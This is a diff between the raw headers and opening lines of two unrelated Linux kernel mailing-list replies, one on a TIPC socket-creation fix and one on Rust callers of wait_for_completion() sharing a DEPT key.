@@ -1,240 +1,243 @@
-Return-Path: <netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-306442-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by mail.lfdr.de with LMTP
-	id YRn2C82HUGpO0wIAu9opvQ
-	(envelope-from <netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 07:49:01 +0200
+	id bZxJDTGJUGrS0wIAu9opvQ
+	(envelope-from <netdev+bounces-306442-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 07:54:57 +0200
 X-Original-To: lists+netdev@lfdr.de
 Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 6FCC973768E
-	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 07:49:00 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 39442737715
+	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 07:54:56 +0200 (CEST)
 Authentication-Results: mail.lfdr.de;
-	dkim=pass header.d=gmail.com header.s=20251104 header.b=ZOGWYle6;
-	dmarc=pass (policy=none) header.from=gmail.com;
-	spf=pass (mail.lfdr.de: domain of "netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org" designates 172.234.253.10 as permitted sender) smtp.mailfrom="netdev+bounces-306441-lists+netdev=lfdr.de@vger.kernel.org";
+	dkim=none;
+	dmarc=fail reason="SPF not aligned (relaxed), No valid DKIM" header.from=sk.com (policy=none);
+	spf=pass (mail.lfdr.de: domain of "netdev+bounces-306442-lists+netdev=lfdr.de@vger.kernel.org" designates 172.234.253.10 as permitted sender) smtp.mailfrom="netdev+bounces-306442-lists+netdev=lfdr.de@vger.kernel.org";
 	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id 20E8B3010BA1
-	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 05:48:59 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id D50E9301DAF5
+	for <lists+netdev@lfdr.de>; Fri, 10 Jul 2026 05:54:15 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 634A238228C;
-	Fri, 10 Jul 2026 05:48:58 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 0FCD0395AC6;
+	Fri, 10 Jul 2026 05:54:14 +0000 (UTC)
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 09D4531E853
-	for <netdev@vger.kernel.org>; Fri, 10 Jul 2026 05:48:56 +0000 (UTC)
+Received: from invmail4.hynix.com (exvmail4.hynix.com [166.125.252.92])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id BCC83233958;
+	Fri, 10 Jul 2026 05:54:07 +0000 (UTC)
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1783662538; cv=none; b=GpZktyXKmaP6jHDVNg1ppuw3Bxm9QEwG8xw6st749I3VYICJUth4Q56j0waox98x2qlb4DmFP46wXDMXKVX5iFbCOclCWHE6/+YcAKoDE7N8ajbWWTj8pfuTEEDn2Df/XpMVwOL1/HCvdBUrtZCCths8UTsHYQiLbbxkKL0zqGE=
+	t=1783662853; cv=none; b=ueCD2zFrv+MdlRfIJHrHCJdhZo9HanZ55ZK/uRY8v2OQNFNLp5ENywz/DMih1EI0vWDe8BbiGhjXkG2ncSCxwBLfLaw5NJcTj2rAwjnC1i+C7132BtbKDJVFuKva1RfsB2+DHWa+gBYpoEqEGKsy/0rpIvbhwPnmwYTsjY2SClo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1783662538; c=relaxed/simple;
-	bh=MOtOYp7sW8HYnB7HJ3MKYD5DYJRtwirDuPHlckMd2bg=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=JoBr/AvlNc+6r02cVxZHcXHt1ZhtZG/0NAdp4LLwvOkXZUpzTw4zNxHi6rRQOiQcgCKgMpoQgxoRYvvwVBcXPPR421jsu+BUK4F62FfUh/FEXifW6chrnTpKZ2JpkarEzrHWvyaWm2QmJYpISikjfbe4WaFLkkQbeUBbyl5fmyM=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ZOGWYle6; arc=none smtp.client-ip=209.85.216.49
-Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-37e0a189b0bso562522a91.1
-        for <netdev@vger.kernel.org>; Thu, 09 Jul 2026 22:48:56 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1783662536; x=1784267336; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=vshExmACqo4o+e1KjGRalp/CjfYkXQ/9vg4sj4m5Q18=;
-        b=ZOGWYle6qhof30ngofURWU8DD0XFdjO3kuGW98ZLRxyo/0M1Ygyz4mF1Ulq5cP/bds
-         NhAD1S3P9azCIHMoF4z1emMHtzVDAGnYFHUZFMF1VS9GgHigbO3tMwPfEs5YCh8SFkJG
-         BJ4BMdXJqODaeAOxzj16WAU96sk3NhZKrAsr3VltKRRpR22oV0U1KRAul3ZB5KOYlJpH
-         Ek/PVQO45GEVDRRW/Bz75gWxYVBrwe34PtYj0OtbRl5Xga79Jj37oo8YDjJVT8zZwUXd
-         70X5n12uN/6Rq1fGpIsrlpm/LNZWkX8gTB6RqBTzAMPROqYUZOIcCeqivQ7JwUQ3dGhu
-         rg4Q==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1783662536; x=1784267336;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=vshExmACqo4o+e1KjGRalp/CjfYkXQ/9vg4sj4m5Q18=;
-        b=YWoWay8/n+TkRTjBucQjpY8jZQ+cGEsoUxQPdgoTmac1gzs8fDlGbdr2aRn1US5NzT
-         ZZo2s55CTfuMJ6zm0whE1KVy66Cz5VoiNf2DQLtHRcSiV6v0cWI/3AUdizXzjZe6CfiP
-         BdtK9rLqNDqqaZ0tJwgokLR/rPnjn9WQYaGxAJvw3kvgbrx+HqQj4QLXFi8DZJFsRGQq
-         MlYTP9CFLw+K3Lf6wnKrsfcsMXP+TSiqTIsPrDVuH7cPliXeK8BkQ3XztZsABhTCp+37
-         FDGqvMecoe+gMBmxhY7J/XQgci1TyzMpD5xXP99ZG7QoMCO7ZQnrTRFJ7HBhr56Ur8lu
-         QS3A==
-X-Gm-Message-State: AOJu0YxdxoTmjlw203yTsNeXsZCu4pBKzQ+pQvc2NRHCQyGPGHgan3/u
-	2txNRtlbhh9/g0xBGEkntqH3OuMfOg4idUwJ1E/64ZRErO1JwmqDsDR9
-X-Gm-Gg: AfdE7ckrgCXrFNr8/wjatJz98FU7PGqQHXqQzwRU2XeD90pwRZeNNZGtrZSJnMNJusq
-	uLfrz2ZVrSg+XCfM6yOp8ZDyDoOqEUMmoMfoZLbg3zEZv8npmi3ztzAkr0dhuVzHORHUIgmIZrR
-	/FCMrp0vixdbV70LGSxB6Z3AzbbvIlCOAE3htlOgHz08os/PJK/imJjrf/pqn8j9eOSUzHiLSpr
-	DbYD+xtnbCkWgTQDA9goebmMQ5Khah42Y0Z2HlLMj+/IXTJ2KgQ2Ayx7RLSWPdrrelo6GlNDV3R
-	Kvm1RGewhna0vlgLBvhYLxaAYtl98642hXA/bkSn84lxnGeI+6ezUsdHGqyyKbX7uvaINxEPWJL
-	gtEkLvT5//St+OgvMJTWa3u6rT6ZUaNX1u//1TZW3oRroKooRwkK9CPq9ykjhQ1DUI7JaQ/4dvR
-	Lwzpll5Tjiu3wVV4lXe7keWHsy1xSVQYlly9s=
-X-Received: by 2002:a17:90b:4ac7:b0:381:12d5:1ab5 with SMTP id 98e67ed59e1d1-3893d33aa6fmr10333769a91.0.1783662536061;
-        Thu, 09 Jul 2026 22:48:56 -0700 (PDT)
-Received: from ancienth-X870E-Nova-WiFi ([125.186.72.2])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38a58792cdasm2186183a91.16.2026.07.09.22.48.52
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 09 Jul 2026 22:48:55 -0700 (PDT)
-From: Daehyeon Ko <4ncienth@gmail.com>
-To: Tung Quang Nguyen <tung.quang.nguyen@est.tech>
-Cc: netdev@vger.kernel.org,
-	Jon Maloy <jmaloy@redhat.com>,
-	"David S . Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>,
-	tipc-discussion@lists.sourceforge.net,
-	linux-kernel@vger.kernel.org,
-	Daehyeon Ko <4ncienth@gmail.com>
-Subject: Re: [PATCH net] tipc: clear sock->sk on the failed-insert path in tipc_sk_create()
-Date: Fri, 10 Jul 2026 14:48:15 +0900
-Message-ID: <20260710054815.3995322-1-4ncienth@gmail.com>
-X-Mailer: git-send-email 2.54.0
-In-Reply-To: <GV1P189MB19888A8F810E5DB896F9BAD5C6FD2@GV1P189MB1988.EURP189.PROD.OUTLOOK.COM>
-References: <GV1P189MB19888A8F810E5DB896F9BAD5C6FD2@GV1P189MB1988.EURP189.PROD.OUTLOOK.COM>
+	s=arc-20240116; t=1783662853; c=relaxed/simple;
+	bh=nyDBnktELM+hz7RvTSyEr5tTXDizK+ufnQXY3jTKq48=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=HHnNTng40LYlxMTCqM6XcjVREF4/k/oaH9ahfyy5Arw+jpXnGc2i8Ro68QoH8dv0kZTkQHDUG5mFrx9Gx8Rpj42bJHAz2j5bVoS/6hG1WcF2kODfR8+yWe798+pf5Lz/2Ys5KXyOkrwWnt1aveZUFtJtjAV3PUMe3YYQo+V6YOM=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=sk.com; spf=pass smtp.mailfrom=sk.com; arc=none smtp.client-ip=166.125.252.92
+X-AuditID: a67dfc5b-c45ff70000001609-cb-6a5088f7cfdd
+Date: Fri, 10 Jul 2026 14:53:54 +0900
+From: Byungchul Park <byungchul@sk.com>
+To: Gary Guo <gary@garyguo.net>
+Cc: linux-kernel@vger.kernel.org, max.byungchul.park@gmail.com,
+	kernel_team@skhynix.com, torvalds@linux-foundation.org,
+	damien.lemoal@opensource.wdc.com, linux-ide@vger.kernel.org,
+	adilger.kernel@dilger.ca, linux-ext4@vger.kernel.org,
+	mingo@redhat.com, peterz@infradead.org, will@kernel.org,
+	tglx@linutronix.de, rostedt@goodmis.org, joel@joelfernandes.org,
+	sashal@kernel.org, daniel.vetter@ffwll.ch, duyuyang@gmail.com,
+	johannes.berg@intel.com, tj@kernel.org, tytso@mit.edu,
+	willy@infradead.org, david@fromorbit.com, amir73il@gmail.com,
+	gregkh@linuxfoundation.org, kernel-team@lge.com, linux-mm@kvack.org,
+	akpm@linux-foundation.org, mhocko@kernel.org, minchan@kernel.org,
+	hannes@cmpxchg.org, vdavydov.dev@gmail.com, sj@kernel.org,
+	jglisse@redhat.com, dennis@kernel.org, cl@linux.com,
+	penberg@kernel.org, rientjes@google.com, vbabka@suse.cz,
+	ngupta@vflare.org, linux-block@vger.kernel.org,
+	josef@toxicpanda.com, linux-fsdevel@vger.kernel.org, jack@suse.cz,
+	jlayton@kernel.org, dan.j.williams@intel.com, hch@infradead.org,
+	djwong@kernel.org, dri-devel@lists.freedesktop.org,
+	rodrigosiqueiramelo@gmail.com, melissa.srw@gmail.com,
+	hamohammed.sa@gmail.com, harry.yoo@oracle.com,
+	chris.p.wilson@intel.com, gwan-gyeong.mun@intel.com,
+	boqun.feng@gmail.com, longman@redhat.com, yunseong.kim@ericsson.com,
+	ysk@kzalloc.com, yeoreum.yun@arm.com, netdev@vger.kernel.org,
+	matthew.brost@intel.com, her0gyugyu@gmail.com, corbet@lwn.net,
+	catalin.marinas@arm.com, bp@alien8.de, x86@kernel.org,
+	hpa@zytor.com, luto@kernel.org, sumit.semwal@linaro.org,
+	gustavo@padovan.org, christian.koenig@amd.com,
+	andi.shyti@kernel.org, arnd@arndb.de, lorenzo.stoakes@oracle.com,
+	Liam.Howlett@oracle.com, rppt@kernel.org, surenb@google.com,
+	mcgrof@kernel.org, petr.pavlu@suse.com, da.gomez@kernel.org,
+	samitolvanen@google.com, paulmck@kernel.org, frederic@kernel.org,
+	neeraj.upadhyay@kernel.org, joelagnelf@nvidia.com,
+	josh@joshtriplett.org, urezki@gmail.com,
+	mathieu.desnoyers@efficios.com, jiangshanlai@gmail.com,
+	qiang.zhang@linux.dev, juri.lelli@redhat.com,
+	vincent.guittot@linaro.org, dietmar.eggemann@arm.com,
+	bsegall@google.com, mgorman@suse.de, vschneid@redhat.com,
+	chuck.lever@oracle.com, neil@brown.name, okorniev@redhat.com,
+	Dai.Ngo@oracle.com, tom@talpey.com, trondmy@kernel.org,
+	anna@kernel.org, kees@kernel.org, bigeasy@linutronix.de,
+	clrkwllms@kernel.org, mark.rutland@arm.com, ada.coupriediaz@arm.com,
+	kristina.martsenko@arm.com, wangkefeng.wang@huawei.com,
+	broonie@kernel.org, kevin.brodsky@arm.com, dwmw@amazon.co.uk,
+	shakeel.butt@linux.dev, ast@kernel.org, ziy@nvidia.com,
+	yuzhao@google.com, baolin.wang@linux.alibaba.com,
+	usamaarif642@gmail.com, joel.granados@kernel.org,
+	richard.weiyang@gmail.com, geert+renesas@glider.be,
+	tim.c.chen@linux.intel.com, linux@treblig.org,
+	alexander.shishkin@linux.intel.com, lillian@star-ark.net,
+	chenhuacai@kernel.org, francesco@valla.it,
+	guoweikang.kernel@gmail.com, link@vivo.com, jpoimboe@kernel.org,
+	masahiroy@kernel.org, brauner@kernel.org,
+	thomas.weissschuh@linutronix.de, oleg@redhat.com, mjguzik@gmail.com,
+	andrii@kernel.org, wangfushuai@baidu.com, linux-doc@vger.kernel.org,
+	linux-arm-kernel@lists.infradead.org, linux-media@vger.kernel.org,
+	linaro-mm-sig@lists.linaro.org, linux-i2c@vger.kernel.org,
+	linux-arch@vger.kernel.org, linux-modules@vger.kernel.org,
+	rcu@vger.kernel.org, linux-nfs@vger.kernel.org,
+	linux-rt-devel@lists.linux.dev, 2407018371@qq.com, dakr@kernel.org,
+	miguel.ojeda.sandonis@gmail.com, neilb@ownmail.net,
+	bagasdotme@gmail.com, wsa+renesas@sang-engineering.com,
+	dave.hansen@intel.com, geert@linux-m68k.org, ojeda@kernel.org,
+	alex.gaynor@gmail.com, bjorn3_gh@protonmail.com, lossin@kernel.org,
+	a.hindborg@kernel.org, aliceryhl@google.com, tmgross@umich.edu,
+	rust-for-linux@vger.kernel.org
+Subject: Re: [PATCH v19 31/40] dept: assign unique dept_key to each distinct
+ wait_for_completion() caller
+Message-ID: <20260710055354.GA37630@system.software.com>
+References: <20260706061928.66713-1-byungchul@sk.com>
+ <20260706061928.66713-32-byungchul@sk.com>
+ <DJSEK3KA2ECQ.1512A4KGOBSCV@garyguo.net>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <DJSEK3KA2ECQ.1512A4KGOBSCV@garyguo.net>
+User-Agent: Mutt/1.9.4 (2018-02-28)
+X-Brightmail-Tracker: H4sIAAAAAAAAA02Sa0yTdxTG93/vNDR56WT7C7t2LltYdOIlHp0xkizxTeaGyZYscR9mI+9G
+	paBpBcHEKGNIvYDYbHa0CuU2uVQg5TJXMDKEAmYd2LFSMy6WmzhaFaTVAaUrVTO//fKc5zzn
+	+XA4UlbJxHDKtMOiOk2hkjMSSuKNLF37RLvnwPpsezRoc4/DxXozA1pLEQ09g99RMOrTInD1
+	XyfB3JRNgGHKyIJ3tJWGQb8HwUR7HoLAhRQoKWtkYNHeR0Kpe5iEJtsIgsnCZhIGfA8YuPX7
+	DIJLRh2CnPJ6BoYu6Agw6qcJWHLHg632LgvD536koM7bR8PMlI6B0e6TNMwPuAkwn50iQWv1
+	UWAZd9JQVDwUaheYR2C7OkbAn9aLDIyYgzT0Gqop+Nt+joU+6xUaKgdvEeC+46LBVTiJ4Lbe
+	w4Kj3URA1ayehuprdgZspleg+Xougrzp1lCngn8o6Kz/hYAbPg8BTl0JA/aWmywYswsQaDv9
+	JDTMXmag4I9d8KRhPNSutoaBKwEnAmPXCLtzp5DrCDCCudiMhPnKHFJY8P3FCNf8Jkq4WYaF
+	ilMLhHDevlb41TDMCiZLumCpOcUIljkdK5QuTpPCkLONEXp+WqSEiQE9sWfNXsn2JFGlzBDV
+	H+7YJ0nuqmihDhVHZVqn2sgTaFZ6GkVwmN+Eg3W11HMe62yjV5ji38XeHA+7wgz/Hna5/iVX
+	eBX/JrbUlBGnkYQj+aI3sMPfG154mU/BS1X3wiYpD/iGszxskvH5CNsWjPTTQRTuLZoIXyP5
+	OOxavhcycSGOxZeXuRU5gt+MHzbNhQ9H8+/g9pbucA7mxyLwD03BZ01X49+qXFQh4g0vxBpe
+	iDX8H2tCZA2SKdMyUhVK1aZ1yVlpysx1+w+mWlDoeX8+tvTVVTTX/3kH4jkkj5SuP554QEYr
+	MjRZqR0Ic6R8lfTOayFJmqTIOiqqD36tTleJmg4Uy1HyV6Ub/EeSZPy3isNiiigeEtXPpwQX
+	EXMCfbT68dmSjEcboh7sqBYeJSYc5S59sezemOh4W7mldZ7dpo0MNH7g399g8yWc2V5uD3q8
+	j83tL/V8Ulea3510X+yK7y52n+wTtlYob79Fzk1+s9uTrylMOO/I/D5Gr7qf93GjpGHX+0FZ
+	+mdL2XfjzlQd+3T89X39bbutX0Y3z2xrdcTKKU2yIj6OVGsU/wHjrPZquAMAAA==
+X-Brightmail-Tracker: H4sIAAAAAAAAA02Sa0xTZxjH877n9PTQWT0UCCdek5rFhEyRTZIn2bKLmXpivPCNhCzRRk9G
+	5aJpEWUJU6iN1ampTVqk9QJFKitMsCCOSyMBrUPnbLlIo7DCUuu6giBQCJeWnWKMfnnye57n
+	/8vzfnhpQrYkWk0r8wt4Vb4iV05JSMm+LzWbZ3UZR7bet6aCTnsKBn1+ETwv6SAhPK0j4Wp9
+	HQURyz0x6BzlIvhjoJQE9+1aBL6wDsHsgoUAbcsSCRGDSwzTcy/FYCxBsOR0ITB5DAR43fcJ
+	qGsqwTDVEKUg1DWJwDjip6AsWELCuO0CAnPAIobgw10w5msTwdLQawwDM6MIbP4oBn/HWQQR
+	Uw7csDYKummCgoWnzwgoM7oRVI4METAZHEbQ5PobgbOmlIJX+rsE9PpXQl94nIJu4y8UjHmu
+	YnjTQEFFqVMEnj9DCK5ZDAgCL5wYNFX1FJiuOUhoGW4Vgye0iGHQZMBQ69gLPluAhCd6Kxae
+	K6TuJIOlTIOF8i8G429tGOZsdvG31Yib1V4iOXtjM+a0PRGKq7teh7iFeQPipqs1BKfVC23X
+	6DjBnWk8wVU/GaW4+XA/xTlnKkjusZXlbp6bx9zlp5u5FvOQOOO7LMlXh/lcZSGvSv36oCT7
+	4c1m8tj1+JOtgXbiNHorPY/iaJbZxv7zoF0UY5L5lB3TjIpjTDGbWK93johxIrOBddit+DyS
+	0ARTvp7tmeleFhKYHHaxJrgckjLAdj2vWg7JmIuIdc1bRO8W8Wx3uZ+MMcGksN5oUAjRAq9h
+	b0Xp2DiOSWcnmiaXDycxG9mO5kdYj6Tmj2zzR7b5g12BCDtKVOYX5imUuelb1DnZRfnKk1sO
+	Hc1zIOFb2ooXL/+Opnt3dSKGRvIV0q2n9h+RiRSF6qK8TsTShDxROrxWGEkPK4p+4lVHD6iO
+	5/LqTrSGJuXJ0t2Z/EEZ86OigM/h+WO86v0W03GrT6NNrXcKip9lq88W7zBMeONTd//X03ku
+	lLh36pXsojnl5aNP0jrazUWRAcnaK+4+Q8iV3PD5TllCZtKqxuTt4YxfM+9VfpEU/N7zwD5Y
+	2+/ybf+mH+uyVuzYqV73Q3Pv20D6SNvdqopV6/V861Rl9K8+RVZC8DO38/XjffXMngvlB9J+
+	lpPqbEVaCqFSK/4HtzJC/ZIDAAA=
+X-CFilter-Loop: Reflected
 X-Rspamd-Action: no action
-X-Spamd-Result: default: False [-0.66 / 15.00];
+X-Spamd-Result: default: False [0.14 / 15.00];
+	SUSPICIOUS_RECIPS(1.50)[];
 	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
-	MID_CONTAINS_FROM(1.00)[];
-	R_MISSING_CHARSET(0.50)[];
-	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
-	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
 	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
 	MAILLIST(-0.15)[generic];
+	DMARC_POLICY_SOFTFAIL(0.10)[sk.com : SPF not aligned (relaxed), No valid DKIM,none];
 	MIME_GOOD(-0.10)[text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	FORWARDED(0.00)[lists@lfdr.de];
-	TO_DN_SOME(0.00)[];
-	FREEMAIL_CC(0.00)[vger.kernel.org,redhat.com,davemloft.net,google.com,kernel.org,lists.sourceforge.net,gmail.com];
-	MIME_TRACE(0.00)[0:+];
-	TAGGED_FROM(0.00)[bounces-306441-lists,netdev=lfdr.de];
-	FORGED_SENDER_MAILLIST(0.00)[];
+	TAGGED_FROM(0.00)[bounces-306442-lists,netdev=lfdr.de];
 	RCVD_TLS_LAST(0.00)[];
-	FORGED_RECIPIENTS(0.00)[m:tung.quang.nguyen@est.tech,m:netdev@vger.kernel.org,m:jmaloy@redhat.com,m:davem@davemloft.net,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:horms@kernel.org,m:tipc-discussion@lists.sourceforge.net,m:linux-kernel@vger.kernel.org,m:4ncienth@gmail.com,s:lists@lfdr.de];
-	FORGED_SENDER(0.00)[4ncienth@gmail.com,netdev@vger.kernel.org];
-	DKIM_TRACE(0.00)[gmail.com:+];
-	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
-	FREEMAIL_FROM(0.00)[gmail.com];
-	PRECEDENCE_BULK(0.00)[];
-	FORGED_SENDER_FORWARDING(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[4ncienth@gmail.com,netdev@vger.kernel.org];
 	FROM_HAS_DN(0.00)[];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
-	RCPT_COUNT_SEVEN(0.00)[11];
-	RCVD_VIA_SMTP_AUTH(0.00)[];
-	ALIAS_RESOLVED(0.00)[];
-	TAGGED_RCPT(0.00)[netdev];
+	FORGED_RECIPIENTS(0.00)[m:gary@garyguo.net,m:linux-kernel@vger.kernel.org,m:max.byungchul.park@gmail.com,m:kernel_team@skhynix.com,m:torvalds@linux-foundation.org,m:damien.lemoal@opensource.wdc.com,m:linux-ide@vger.kernel.org,m:adilger.kernel@dilger.ca,m:linux-ext4@vger.kernel.org,m:mingo@redhat.com,m:peterz@infradead.org,m:will@kernel.org,m:tglx@linutronix.de,m:rostedt@goodmis.org,m:joel@joelfernandes.org,m:sashal@kernel.org,m:daniel.vetter@ffwll.ch,m:duyuyang@gmail.com,m:johannes.berg@intel.com,m:tj@kernel.org,m:tytso@mit.edu,m:willy@infradead.org,m:david@fromorbit.com,m:amir73il@gmail.com,m:gregkh@linuxfoundation.org,m:kernel-team@lge.com,m:linux-mm@kvack.org,m:akpm@linux-foundation.org,m:mhocko@kernel.org,m:minchan@kernel.org,m:hannes@cmpxchg.org,m:vdavydov.dev@gmail.com,m:sj@kernel.org,m:jglisse@redhat.com,m:dennis@kernel.org,m:cl@linux.com,m:penberg@kernel.org,m:rientjes@google.com,m:vbabka@suse.cz,m:ngupta@vflare.org,m:linux-block@vger.kernel.org,m:josef@toxicpanda.com,m:linu
+ x-fsdevel@vger.kernel.org,m:jack@suse.cz,m:jlayton@kernel.org,m:dan.j.williams@intel.com,m:hch@infradead.org,m:djwong@kernel.org,m:dri-devel@lists.freedesktop.org,m:rodrigosiqueiramelo@gmail.com,m:melissa.srw@gmail.com,m:hamohammed.sa@gmail.com,m:harry.yoo@oracle.com,m:chris.p.wilson@intel.com,m:gwan-gyeong.mun@intel.com,m:boqun.feng@gmail.com,m:longman@redhat.com,m:yunseong.kim@ericsson.com,m:ysk@kzalloc.com,m:yeoreum.yun@arm.com,m:netdev@vger.kernel.org,m:matthew.brost@intel.com,m:her0gyugyu@gmail.com,m:corbet@lwn.net,m:catalin.marinas@arm.com,m:bp@alien8.de,m:x86@kernel.org,m:hpa@zytor.com,m:luto@kernel.org,m:sumit.semwal@linaro.org,m:gustavo@padovan.org,m:christian.koenig@amd.com,m:andi.shyti@kernel.org,m:arnd@arndb.de,m:lorenzo.stoakes@oracle.com,m:Liam.Howlett@oracle.com,m:rppt@kernel.org,m:surenb@google.com,m:mcgrof@kernel.org,m:petr.pavlu@suse.com,m:da.gomez@kernel.org,m:samitolvanen@google.com,m:paulmck@kernel.org,m:frederic@kernel.org,m:neeraj.upadhyay@kernel.org,m:joelagn
+ elf@nvidia.com,m:josh@joshtriplett.org,m:urezki@gmail.com,m:mathieu.desnoyers@efficios.com,m:jiangshanlai@gmail.com,m:qiang.zhang@linux.dev,m:juri.lelli@redhat.com,m:vincent.guittot@linaro.org,m:dietmar.eggemann@arm.com,m:bsegall@google.com,m:mgorman@suse.de,m:vschneid@redhat.com,m:chuck.lever@oracle.com,m:neil@brown.name,s:lists@lfdr.de];
+	FORGED_SENDER(0.00)[byungchul@sk.com,netdev@vger.kernel.org];
+	MIME_TRACE(0.00)[0:+];
+	RCVD_COUNT_THREE(0.00)[3];
+	FORWARDED(0.00)[lists@lfdr.de];
+	FORGED_SENDER_MAILLIST(0.00)[];
+	FREEMAIL_CC(0.00)[vger.kernel.org,gmail.com,skhynix.com,linux-foundation.org,opensource.wdc.com,dilger.ca,redhat.com,infradead.org,kernel.org,linutronix.de,goodmis.org,joelfernandes.org,ffwll.ch,intel.com,mit.edu,fromorbit.com,linuxfoundation.org,lge.com,kvack.org,cmpxchg.org,linux.com,google.com,suse.cz,vflare.org,toxicpanda.com,lists.freedesktop.org,oracle.com,ericsson.com,kzalloc.com,arm.com,lwn.net,alien8.de,zytor.com,linaro.org,padovan.org,amd.com,arndb.de,suse.com,nvidia.com,joshtriplett.org,efficios.com,linux.dev,suse.de,brown.name,talpey.com,huawei.com,amazon.co.uk,linux.alibaba.com,glider.be,linux.intel.com,treblig.org,star-ark.net,valla.it,vivo.com,baidu.com,lists.infradead.org,lists.linaro.org,lists.linux.dev,qq.com,ownmail.net,sang-engineering.com,linux-m68k.org,protonmail.com,umich.edu];
 	FORGED_RECIPIENTS_FORWARDING(0.00)[];
+	TO_DN_SOME(0.00)[];
+	FORGED_SENDER_FORWARDING(0.00)[];
+	PRECEDENCE_BULK(0.00)[];
+	FROM_NEQ_ENVFROM(0.00)[byungchul@sk.com,netdev@vger.kernel.org];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	RCPT_COUNT_GT_50(0.00)[165];
+	R_DKIM_NA(0.00)[];
+	ALIAS_RESOLVED(0.00)[];
+	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
+	TAGGED_RCPT(0.00)[netdev,renesas];
 	DBL_BLOCKED_OPENRESOLVER(0.00)[vger.kernel.org:from_smtp,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
 X-Rspamd-Server: lfdr
-X-Rspamd-Queue-Id: 6FCC973768E
+X-Rspamd-Queue-Id: 39442737715
 
-Hi Tung,
+On Tue, Jul 07, 2026 at 03:18:29PM +0100, Gary Guo wrote:
+> On Mon Jul 6, 2026 at 7:19 AM BST, Byungchul Park wrote:
+> > wait_for_completion() can be used at various points in the code and it's
+> > very hard to distinguish wait_for_completion()s between different usages.
+> > Using a single dept_key for all the wait_for_completion()s could trigger
+> > false positive reports.
+> >
+> > Assign unique dept_key to each distinct wait_for_completion() caller to
+> > avoid false positive reports.
+> >
+> > While at it, add a rust helper for wait_for_completion() to avoid build
+> > errors.
+> 
+> This will cause Rust code to share the same dept_key, so it will have all the
+> false positives that the change is trying to avoid.
 
-Here's the reproducer; build/run notes and the insert-failure precondition are
